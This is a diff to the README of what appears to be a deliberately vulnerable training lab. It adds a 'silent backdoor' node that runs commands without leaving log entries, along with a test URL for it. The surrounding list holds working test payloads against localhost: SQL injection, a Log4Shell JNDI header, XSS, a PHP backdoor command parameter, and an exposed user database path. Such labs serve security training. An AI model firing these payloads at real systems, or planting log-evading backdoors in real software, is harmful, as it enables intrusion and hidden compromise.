@@ -41,6 +41,7 @@ The nodes within VulnHive map directly to critical vulnerabilities identified in
 | **Insecure Design**| IDOR / Broken Access | Bus Pass Management 1.0 (Searchsploit 50263)| A04:2021-Insecure Design |
 | **Security Misconfig**| Default Credentials | CMSimple 5.15 (Searchsploit 39271) | A05:2021-Security Misconfiguration |
 | **Outdated Component**| Log4Shell (RCE) | Log4j 2.14.1 (CVE-2021-44228) | A06:2021-Vulnerable and Outdated Components |
+| **Logging Failure** | Silent Backdoor | Custom Silent-Admin Node | A09:2021-Security Logging and Monitoring Failures |
 
 ## Installation & Usage
 
@@ -73,6 +74,7 @@ To verify your environment is working, you can try the following payloads agains
 *   **SQLi (Cuppa CMS):** `http://127.0.0.1:54323/index.php?id=1'%20OR%201=1`
 *   **Crypto (CuteNews):** `http://127.0.0.1:54330/data/users.db.php`
 *   **Log4j (Outdated):** `curl http://127.0.0.1:54331 -H 'X-Api-Version: ${jndi:ldap://127.0.0.1:1389/a}'`
+*   **Logging Fail (A09):** `http://127.0.0.1:54332/hidden_admin.php?cmd=id` (Note: This action is silent in logs)
 *   **XSS (WonderCMS):** `http://127.0.0.1:54324/?xss=<script>alert('VulnHive')</script>`
 *   **PHP Backdoor:** `http://127.0.0.1:54325/?cmd=whoami`
 
